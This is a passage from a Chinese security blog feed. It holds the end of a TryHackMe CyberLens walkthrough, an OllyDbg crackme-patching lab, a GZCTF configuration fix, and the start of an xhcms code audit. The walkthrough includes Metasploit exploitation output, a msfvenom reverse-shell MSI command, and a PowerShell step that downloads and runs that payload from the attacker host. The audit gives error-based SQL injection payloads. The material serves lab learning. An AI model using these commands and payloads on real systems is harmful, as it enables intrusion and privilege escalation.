61777<br>msf6 exploit(windows/http/apache_tika_jp2_jscript) &gt; check<br>[+] 10.10.2.208:61777 - The target is vulnerable.<br>msf6 exploit(windows/http/apache_tika_jp2_jscript) &gt; run<br>[*] Started reverse TCP handler on 10.2.26.216:4444 <br>[*] Running automatic check (&quot;set AutoCheck false&quot; to disable)<br>[+] The target is vulnerable.<br>[*] Sending PUT request to 10.10.2.208:61777/meta<br>[*] Command Stager progress -   8.10% done (7999/98798 bytes)<br>[*] Sending PUT request to 10.10.2.208:61777/meta<br>[*] Command Stager progress -  16.19% done (15998/98798 bytes)<br>[*] Sending PUT request to 10.10.2.208:61777/meta<br>[*] Command Stager progress -  24.29% done (23997/98798 bytes)<br>[*] Sending PUT request to 10.10.2.208:61777/meta<br>[*] Command Stager progress -  32.39% done (31996/98798 bytes)<br>[*] Sending PUT request to 10.10.2.208:61777/meta<br>[*] Command Stager progress -  40.48% done (39995/98798 bytes)<br>[*] Sending PUT request to 10.10.2.208:61777/meta<br>[*] Command Stager progress -  48.58% done (47994/98798 bytes)<br>[*] Sending PUT request to 10.10.2.208:61777/meta<br>[*] Command Stager progress -  56.67% done (55993/98798 bytes)<br>[*] Sending PUT request to 10.10.2.208:61777/meta<br>[*] Command Stager progress -  64.77% done (63992/98798 bytes)<br>[*] Sending PUT request to 10.10.2.208:61777/meta<br>[*] Command Stager progress -  72.87% done (71991/98798 bytes)<br>[*] Sending PUT request to 10.10.2.208:61777/meta<br>[*] Command Stager progress -  80.96% done (79990/98798 bytes)<br>[*] Sending PUT request to 10.10.2.208:61777/meta<br>[*] Command Stager progress -  89.06% done (87989/98798 bytes)<br>[*] Sending PUT request to 10.10.2.208:61777/meta<br>[*] Command Stager progress -  97.16% done (95988/98798 bytes)<br>[*] Sending PUT request to 10.10.2.208:61777/meta<br>[*] Command Stager progress - 100.00% done (98798/98798 bytes)<br>[*] Sending stage (177734 bytes) to 10.10.2.208<br>[*] Meterpreter session 1 opened (10.2.26.216:4444 -&gt; 10.10.2.208:49711) at 2025-03-06 00:03:56 -0500<br><br>meterpreter &gt;<br></code></pre></td></tr></table></figure><h2 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h2><p>在用户桌面中找到userflag</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs powershell">C:\Users\CyberLens\Desktop&gt;<span class="hljs-built_in">dir</span><br><span class="hljs-built_in">dir</span><br> Volume <span class="hljs-keyword">in</span> drive C has no label.<br> Volume Serial Number is A8A4<span class="hljs-literal">-C362</span><br><br> Directory of C:\Users\CyberLens\Desktop<br><br><span class="hljs-number">06</span>/<span class="hljs-number">06</span>/<span class="hljs-number">2023</span>  <span class="hljs-number">07</span>:<span class="hljs-number">53</span> PM    &lt;<span class="hljs-built_in">DIR</span>&gt;          .<br><span class="hljs-number">06</span>/<span class="hljs-number">06</span>/<span class="hljs-number">2023</span>  <span class="hljs-number">07</span>:<span class="hljs-number">53</span> PM    &lt;<span class="hljs-built_in">DIR</span>&gt;          ..<br><span class="hljs-number">06</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2016</span>  <span class="hljs-number">03</span>:<span class="hljs-number">36</span> PM               <span class="hljs-number">527</span> EC2 Feedback.website<br><span class="hljs-number">06</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2016</span>  <span class="hljs-number">03</span>:<span class="hljs-number">36</span> PM               <span class="hljs-number">554</span> EC2 Microsoft Windows Guide.website<br><span class="hljs-number">06</span>/<span class="hljs-number">06</span>/<span class="hljs-number">2023</span>  <span class="hljs-number">07</span>:<span class="hljs-number">54</span> PM                <span class="hljs-number">25</span> user.txt<br>               <span class="hljs-number">3</span> File(s)          <span class="hljs-number">1</span>,<span class="hljs-number">106</span> bytes<br>               <span class="hljs-number">2</span> <span class="hljs-built_in">Dir</span>(s)  <span class="hljs-number">14</span>,<span class="hljs-number">954</span>,<span class="hljs-number">463</span>,<span class="hljs-number">232</span> bytes free<br><br>C:\Users\CyberLens\Desktop&gt;<span class="hljs-built_in">type</span> user.txt<br><span class="hljs-built_in">type</span> user.txt<br>THM&#123;****************&#125;<br></code></pre></td></tr></table></figure><h2 id="admin-flag"><a href="#admin-flag" class="headerlink" title="admin flag"></a>admin flag</h2><p>使用脚本<a href="https://github.com/itm4n/PrivescCheck">PrivescCheck</a>搜集提权信息</p><p>在攻击机上启动一个http服务，将脚本放在对应文件夹中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 -m http.server 8000<br></code></pre></td></tr></table></figure><p>在靶机上下载</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-ep</span> bypass<span class="hljs-comment"># 启动一个powershell会话</span><br><span class="hljs-built_in">IWR</span> <span class="hljs-literal">-Uri</span> http://<span class="hljs-number">10.2</span>.<span class="hljs-number">26.216</span>:<span class="hljs-number">8000</span>/PrivescCheck.ps1 <span class="hljs-literal">-OutFile</span> PrivescCheck.ps1<span class="hljs-comment"># 下载</span><br>. .\PrivescCheck.ps1; <span class="hljs-built_in">Invoke-PrivescCheck</span> <span class="hljs-literal">-Extended</span><span class="hljs-comment"># 运行</span><br></code></pre></td></tr></table></figure><p>PrivescCheck运行最后会出一个总结</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs powershell">????????????????????????????????????????????????????????????????<br>?                 ~~~ PrivescCheck Summary ~~~                 ?<br>????????????????????????????????????????????????????????????????<br> TA0003 - Persistence<br> - UEFI &amp; Secure Boot  Low<br> - COM server missing module files  Low<br> TA0004 - Privilege Escalation<br> - Root folder permissions  Low<br> - AlwaysInstallElevated  High<br> - Latest updates installed  Medium<br> TA0006 - Credential Access<br> - LSA Protection  Low<br> - Credential Guard  Low<br></code></pre></td></tr></table></figure><p>注意到唯一的一条<code>High</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">- AlwaysInstallElevated  High<br></code></pre></td></tr></table></figure><p><strong>这表示系统的“始终以管理员身份安装”设置被启用，允许任何安装程序以最高权限运行。</strong></p><p>为了利用这一条进行提权，需要生成一个msi木马在靶机上运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.2.26.216 LPORT=4445 -a x64 --platform Windows -f msi -o evil.msi# 生成msi马<br></code></pre></td></tr></table></figure><p>开一个新的msf并在其中启动一个监听器</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">msf6 &gt; use exploit/multi/<span class="hljs-keyword">handler</span><br>[*] <span class="hljs-keyword">Using</span> configured payload generic/shell_reverse_tcp<br>msf6 exploit(multi/<span class="hljs-keyword">handler</span>) &gt; <span class="hljs-keyword">set</span> lhost tun0<br>lhost =&gt; tun0<br>msf6 exploit(multi/<span class="hljs-keyword">handler</span>) &gt; <span class="hljs-keyword">set</span> lport <span class="hljs-number">4445</span><br>lport =&gt; <span class="hljs-number">4445</span><br>msf6 exploit(multi/<span class="hljs-keyword">handler</span>) &gt; run<br>[*] Started <span class="hljs-keyword">reverse</span> TCP <span class="hljs-keyword">handler</span> <span class="hljs-keyword">on</span> <span class="hljs-number">10.2</span><span class="hljs-number">.26</span><span class="hljs-number">.216</span>:<span class="hljs-number">4445</span><br></code></pre></td></tr></table></figure><p>在靶机上下载msi马并运行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-WebRequest</span> <span class="hljs-literal">-Uri</span> http://<span class="hljs-number">10.2</span>.<span class="hljs-number">26.216</span>:<span class="hljs-number">8000</span>/evil.msi <span class="hljs-literal">-OutFile</span> evil.msi; <span class="hljs-built_in">Start-Process</span> evil.msi <span class="hljs-literal">-Wait</span><br></code></pre></td></tr></table></figure><p>拿到高权限shell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs powershell">msf6 exploit(multi/handler) &gt; run<br>[*] Started reverse TCP handler on <span class="hljs-number">10.2</span>.<span class="hljs-number">26.216</span>:<span class="hljs-number">4445</span> <br>[*] Command shell session <span class="hljs-number">1</span> opened (<span class="hljs-number">10.2</span>.<span class="hljs-number">26.216</span>:<span class="hljs-number">4445</span> -&gt; <span class="hljs-number">10.10</span>.<span class="hljs-number">17.174</span>:<span class="hljs-number">49810</span>) at <span class="hljs-number">2025</span><span class="hljs-literal">-03-08</span> <span class="hljs-number">00</span>:<span class="hljs-number">45</span>:<span class="hljs-number">41</span> <span class="hljs-literal">-0500</span><br><br><br>Shell Banner:<br>Microsoft Windows [<span class="hljs-type">Version</span> <span class="hljs-number">10.0</span><span class="hljs-type">.17763.1821</span>]<br><span class="hljs-literal">-----</span><br>          <br><br>C:\Windows\system32&gt;whoami<br>whoami<br>nt authority\system<br></code></pre></td></tr></table></figure><p>在管理员桌面找到<code>admin flag</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">C:\Users\Administrator\Desktop&gt;<span class="hljs-built_in">type</span> admin.txt<br><span class="hljs-built_in">type</span> admin.txt<br>THM&#123;****************&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>THM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>逆向分析实验2 OllyDbg的使用</title>
    <link href="/2025/03/01/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E9%AA%8C2%20OllyDbg%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2025/03/01/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E9%AA%8C2%20OllyDbg%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="逆向分析实验2-OllyDbg的使用"><a href="#逆向分析实验2-OllyDbg的使用" class="headerlink" title="逆向分析实验2 OllyDbg的使用"></a>逆向分析实验2 OllyDbg的使用</h1><h2 id="查找main-函数"><a href="#查找main-函数" class="headerlink" title="查找main()函数"></a>查找main()函数</h2><h3 id="单步跟踪"><a href="#单步跟踪" class="headerlink" title="单步跟踪"></a>单步跟踪</h3><p>先一直使用F8单步步过，发现运行了<code>401144</code>处的函数调用后出现弹窗：</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/image-20250301095654175.png" alt="image-20250301095654175"></p><p>重新运行，并用命令<code>bp 401144</code>在目标函数位置打上断点</p><p>运行到断点后F7单步步入</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/image-20250301100048067.png" alt="image-20250301100048067"></p><p>此函数中调用了<code>MessageBox()</code>函数，并且存在<code>MessageBox()</code>函数中出现的<code>Hello World!</code>和<code>www.reversecore.com</code>字符串</p><p>因此可以确定此函数为<code>main</code>函数，位置为<code>401144</code></p><h3 id="字符串检索"><a href="#字符串检索" class="headerlink" title="字符串检索"></a>字符串检索</h3><p>单击右键-&gt;查找-&gt;所有参考文本字串，找到引用“Hello World!”的地址</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/image-20250301100722535.png" alt="image-20250301100722535"></p><p>双击定位到<code>main()</code>函数中调用<code>MessageBox()</code>函数的代码处，F2设置断点，F9命令运行到该处</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/image-20250301102443581.png" alt="image-20250301102443581"></p><p>在断点窗口查看设置的断点信息</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/image-20250301102230225.png" alt="image-20250301102230225"></p><p>在数据窗口中使用<code>Ctrl+G</code>，输入反汇编代码中的地址<code>4092a0</code>，查看该地址处的字符串</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/image-20250301102307069.png" alt="image-20250301102307069"></p><h3 id="API检索"><a href="#API检索" class="headerlink" title="API检索"></a>API检索</h3><p>单击右键-&gt;查找-&gt;所有模块间的调用，列出程序调用的所有API，找到<code>MessageBoxW()</code>的地址</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/image-20250301102836661.png" alt="image-20250301102836661"></p><p>双击后，定位到<code>main()</code>函数中调用<code>MessageBox()</code>函数的代码处</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/image-20250301102945342.png" alt="image-20250301102945342"></p><h2 id="修改“Hello-World-”字符串"><a href="#修改“Hello-World-”字符串" class="headerlink" title="修改“Hello World!”字符串"></a>修改“Hello World!”字符串</h2><h3 id="直接修改字符串缓冲区"><a href="#直接修改字符串缓冲区" class="headerlink" title="直接修改字符串缓冲区"></a>直接修改字符串缓冲区</h3><p>用上面“字符串检索”中的方法找到<code>Hello World!</code>字符串保存的地址，在数据窗口直接编辑修改该段缓冲区的内容为<code>Hello Reversing!</code></p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/image-20250301104951731.png" alt="image-20250301104951731"></p><p>运行程序后，弹出消息窗口，可以看到显示出新的字符串</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/image-20250301105019385.png" alt="image-20250301105019385"></p><h3 id="在其他内存区域新建字符串并传递给消息函数"><a href="#在其他内存区域新建字符串并传递给消息函数" class="headerlink" title="在其他内存区域新建字符串并传递给消息函数"></a>在其他内存区域新建字符串并传递给消息函数</h3><p>在程序未使用的NULL填充区域找到一个适当位置，写入新字符串<code>Hello Reversing World!!!</code>，并把新建的缓冲区的地址作为参数传递给<code>MessageBoxW()</code>函数</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/image-20250301105752285.png" alt="image-20250301105752285"></p><p>运行程序后，弹出消息窗口，可以看到显示出新的字符串</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/image-20250301105852587.png" alt="image-20250301105852587"></p><h2 id="破解abexcm1-voiees-exe程序"><a href="#破解abexcm1-voiees-exe程序" class="headerlink" title="破解abexcm1-voiees.exe程序"></a>破解abexcm1-voiees.exe程序</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00401000 &gt;/$  6A 00         push 0x0                                 ; /Style = MB_OK|MB_APPLMODAL<br>00401002  |.  68 00204000   push abexcm1-.00402000                   ; |Title = &quot;abex&#x27; 1st crackme&quot;<br>00401007  |.  68 12204000   push abexcm1-.00402012                   ; |Text = &quot;Make me think your HD is a CD-Rom.&quot;<br>0040100C  |.  6A 00         push 0x0                                 ; |hOwner = NULL<br>0040100E  |.  E8 4E000000   call &lt;jmp.&amp;USER32.MessageBoxA&gt;           ; \MessageBoxA<br>00401013  |.  68 94204000   push abexcm1-.00402094                   ; /RootPathName = &quot;c:\&quot;<br>00401018  |.  E8 38000000   call &lt;jmp.&amp;KERNEL32.GetDriveTypeA&gt;       ; \GetDriveTypeA<br>0040101D  |.  46            inc esi<br>0040101E  |.  48            dec eax<br>0040101F  |.  EB 00         jmp short abexcm1-.00401021<br>00401021  |&gt;  46            inc esi<br>00401022  |.  46            inc esi<br>00401023  |.  48            dec eax<br>00401024  |.  3BC6          cmp eax,esi<br>00401026  |.  74 15         je short abexcm1-.0040103D<br>00401028  |.  6A 00         push 0x0                                 ; /Style = MB_OK|MB_APPLMODAL<br>0040102A  |.  68 35204000   push abexcm1-.00402035                   ; |Title = &quot;Error&quot;<br>0040102F  |.  68 3B204000   push abexcm1-.0040203B                   ; |Text = &quot;Nah... This is not a CD-ROM Drive!&quot;<br>00401034  |.  6A 00         push 0x0                                 ; |hOwner = NULL<br>00401036  |.  E8 26000000   call &lt;jmp.&amp;USER32.MessageBoxA&gt;           ; \MessageBoxA<br>0040103B  |.  EB 13         jmp short abexcm1-.00401050<br>0040103D  |&gt;  6A 00         push 0x0                                 ; |/Style = MB_OK|MB_APPLMODAL<br>0040103F  |.  68 5E204000   push abexcm1-.0040205E                   ; ||Title = &quot;YEAH!&quot;<br>00401044  |.  68 64204000   push abexcm1-.00402064                   ; ||Text = &quot;Ok, I really think that your HD is a CD-ROM! :p&quot;<br>00401049  |.  6A 00         push 0x0                                 ; ||hOwner = NULL<br>0040104B  |.  E8 11000000   call &lt;jmp.&amp;USER32.MessageBoxA&gt;           ; |\MessageBoxA<br>00401050  \&gt;  E8 06000000   call &lt;jmp.&amp;KERNEL32.ExitProcess&gt;         ; \ExitProcess<br></code></pre></td></tr></table></figure><p>运行源程序后会弹出消息窗口<code>Make me think your HD is a CD-Rom</code>消息，点击确定后，弹出Error消息<code>Nah…This is not a CD-ROM Drive!</code>。</p><p>我们的目的是尝试破解这个程序，使得点击确定后，弹出正确的输出。</p><p>我注意到<code>0040101F</code>有一个无意义的跳转指令（跳转到下一行指令）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0040101F  |.  EB 00         jmp short abexcm1-.00401021<br></code></pre></td></tr></table></figure><p>这个跳转指令是在第一次弹窗点击确定后、第二次弹窗之前执行的</p><p>或许可以更改跳转地址，使其直接转到弹出正确的输出的代码</p><p>更改其跳转地址为<code>0040103D</code>（弹出正确输出的代码）</p><p>成功</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/image-20250301113056362.png" alt="image-20250301113056362"></p>]]></content>
    
    
    
    <tags>
      
      <tag>实验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于GZCTF平台ip更改后题目容器ip未变的解决办法</title>
    <link href="/2025/01/12/%E5%85%B3%E4%BA%8EGZCTF%E5%B9%B3%E5%8F%B0ip%E6%9B%B4%E6%94%B9%E5%90%8E%E9%A2%98%E7%9B%AE%E5%AE%B9%E5%99%A8ip%E6%9C%AA%E5%8F%98%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
    <url>/2025/01/12/%E5%85%B3%E4%BA%8EGZCTF%E5%B9%B3%E5%8F%B0ip%E6%9B%B4%E6%94%B9%E5%90%8E%E9%A2%98%E7%9B%AE%E5%AE%B9%E5%99%A8ip%E6%9C%AA%E5%8F%98%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="关于GZCTF平台ip更改后题目容器ip未变的解决办法"><a href="#关于GZCTF平台ip更改后题目容器ip未变的解决办法" class="headerlink" title="关于GZCTF平台ip更改后题目容器ip未变的解决办法"></a>关于GZCTF平台ip更改后题目容器ip未变的解决办法</h1><p>将<code>appsettings.json</code>中的<code>PublicEntry</code>值改为当前<code>ip</code></p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/image-20250112115801754.png" alt="image-20250112115801754"></p><p>执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl daemon-reload<br>systemctl restart docker<br></code></pre></td></tr></table></figure><p>解决。</p>]]></content>
    
    
    
    <tags>
      
      <tag>solution</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xhcms代码审计</title>
    <link href="/2024/11/24/xhcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2024/11/24/xhcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="xhcms代码审计"><a href="#xhcms代码审计" class="headerlink" title="xhcms代码审计"></a>xhcms代码审计</h1><p>先用seay自动审计，然后一个个查看验证</p><p><img src="https://cdn.jsdelivr.net/gh/sawtooth384/image/Pic-Go/image-20241124153345463.png" alt="image-20241124153345463"></p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p><code>/index.php</code>和<code>/admin/index.php</code>是一样的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//单一入口模式</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">//关闭错误显示</span><br><span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>]); <span class="hljs-comment">//接收文件名</span><br><span class="hljs-variable">$action</span>=<span class="hljs-variable">$file</span>==<span class="hljs-string">&#x27;&#x27;</span>?<span class="hljs-string">&#x27;index&#x27;</span>:<span class="hljs-variable">$file</span>; <span class="hljs-comment">//判断为空或者等于index</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;files/&#x27;</span>.<span class="hljs-variable">$action</span>.<span class="hljs-string">&#x27;.php&#x27;</span>); <span class="hljs-comment">//载入相应文件</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以看到，前缀和后缀都写死了。</p><p>前缀<code>files/</code>可以通过<code>../</code>进行目录穿越来绕过。</p><p>后缀一般通过<code>%00</code>截断绕过，但这里有<code>addslashes</code>函数，会对NULL字符转义，所以无法使用。</p><p>这里后缀的绕过需要使用长度截断实现，但条件很苛刻</p><p>需要php版本小于<code>5.3.29</code>同时<code>Virtual Directory Support=enable</code></p><p><code>Virtual Directory Support</code>在phpstudy_pro中是默认关闭的。</p><p>总之这里对后缀的绕过在理论上是可行的，但实际上很难实现。</p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>存在很多因变量未过滤导致的sql注入，同时sql报错信息会直接显示出来，可以使用报错注入。</p><p>比如在<code>/admin/files/editlink.php</code>文件中存在下列代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;SELECT * FROM link WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$resul</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$query</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;SQL语句有误：&#x27;</span>.<span class="hljs-title function_ invoke__">mysql_error</span>());<br></code></pre></td></tr></table></figure><p>变量<code>$id</code>未经过滤，直接放在sql查询语句中</p><p>报错时会回显报错信息<code>die(&#39;SQL语句有误：&#39;.mysql_error());</code></p><p>payload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://xhcms.cn/admin/?r=editlink&amp;id=1%27%20and%20(extractvalue(1,concat(0x7e,(select%20user()),0x7e)));--+<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sawtooth384/image/Pic-Go/image-20241124161819119.png" alt="image-20241124161819119"></p><p>以下文件中都存在上述问题代码，payload改一下模块名就能用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">/admin/files/editcolumn.php<br>/admin/files/editcolumn.php    <br>/admin/files/editlink.php<br>/admin/files/editsoft.php<br>/admin/files/editwz.php <br>/admin/files/reply.php<br></code></pre></td></tr></table></figure><p>还有一种是update和insert语句存在的sql注入，同样也是sql注入</p><p>比如在<code>/admin/files/imageset.php</code>文件中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$img_kg</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;img_kg&#x27;</span>];<br><span class="hljs-variable">$img_logo</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;img_logo&#x27;</span>];<br><span class="hljs-variable">$img_weizhi</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;img_weizhi&#x27;</span>];<br><span class="hljs-variable">$img_slt</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;img_slt&#x27;</span>];<br><span class="hljs-variable">$img_moshi</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;img_moshi&#x27;</span>];<br><span class="hljs-variable">$img_wzkd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;img_wzkd&#x27;</span>];<br><span class="hljs-variable">$img_wzgd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;img_wzgd&#x27;</span>];<br>......<br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;UPDATE imageset SET </span><br><span class="hljs-string">img_kg=&#x27;<span class="hljs-subst">$img_kg</span>&#x27;,</span><br><span class="hljs-string"><span class="hljs-subst">$images</span></span><br><span class="hljs-string">img_weizhi=&#x27;<span class="hljs-subst">$img_weizhi</span>&#x27;,</span><br><span class="hljs-string">img_slt=&#x27;<span class="hljs-subst">$img_slt</span>&#x27;,</span><br><span class="hljs-string">img_moshi=&#x27;<span class="hljs-subst">$img_moshi</span>&#x27;,</span><br><span class="hljs-string">img_wzkd=&#x27;<span class="hljs-subst">$img_wzkd</span>&#x27;,</span><br><span class="hljs-string">img_wzgd=&#x27;<span class="hljs-subst">$img_wzgd</span>&#x27;&quot;</span>;<br>@<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$query</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;修改错误：&#x27;</span>.<span class="hljs-title function_ invoke__">mysql_error</span>());<br></code></pre></td></tr></table></figure><p>这里同样是变量未经转义和报错信息回显</p><p>只是payload和select语句中使用的不一样</p><p>payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; or (select * from (select name_const(version(),1),name_const(version(),1))a) or &#x27;</span><br></code></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/sawtooth384/image/Pic-Go/image-20241124163522258.png" alt="image-20241124163522258" style="zoom: 67%;" /><p>随便选个文本框把payload填入点保存即可</p><p><img src="https://cdn.jsdelivr.net/gh/sawtooth384/image/Pic-Go/image-20241124163707931.png" alt="image-20241124163707931"></p><p>以下文件中都存在类似的问题代码，具有相似的利用方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">/admin/files/imageset.php 